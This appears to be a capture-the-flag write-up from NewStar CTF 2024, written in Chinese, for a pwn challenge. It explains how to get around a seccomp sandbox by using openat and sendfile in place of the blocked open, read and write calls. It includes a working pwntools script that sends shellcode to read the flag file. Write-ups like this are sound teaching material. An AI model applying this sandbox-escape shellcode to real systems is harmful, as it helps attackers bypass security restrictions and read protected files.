# Easy_Shellcode

> 分类：Pwn

## 题目描述
程序有 `sandbox` 函数，禁用了 `execve` 和 `execveat`，不能直接 get shell，需要通过 ORW（open read write）得到 flag。同时禁用常规的 `open` `read` `write`，需要用替代品。

沙箱规则（节选）：
- 禁：execve、execveat、open、openat2、read、readv、preadv、pread64、write
- 允许：mmap、openat、preadv2、writev，其余默认 ALLOW

## 考察知识点
- seccomp 沙箱绕过
- ORW shellcode
- 使用 openat / preadv2 / writev / sendfile 等替代系统调用

## 解法
- `open` 的替代：`openat`（或 openat2，本题已禁用）
- `read` 的替代：`readv`、`preadv`、`preadv2`（可用）、`pread64` 或 `mmap`（可用）
- `write` 的替代：`writev`（可用）、`sendfile`（可用，且能省略 read）

使用 shellcraft 时需恢复 `rsp` 寄存器。

```python
#!/usr/bin/env python3
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
context.terminal = ["tmux", "splitw", "-h"]

p = process('./Easy_Shellcode')
elf = ELF('./Easy_Shellcode')

shellcode = '''
    mov rsp, 0x4040c0
'''
shellcode += shellcraft.openat(-100, "/flag", 0, 0)
shellcode += shellcraft.sendfile(1, 3, 0, 0x100)

payload = asm(shellcode)
sla(b'Welcome', payload)

p.interactive()
```

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week3/pwn/easy-shellcode.html
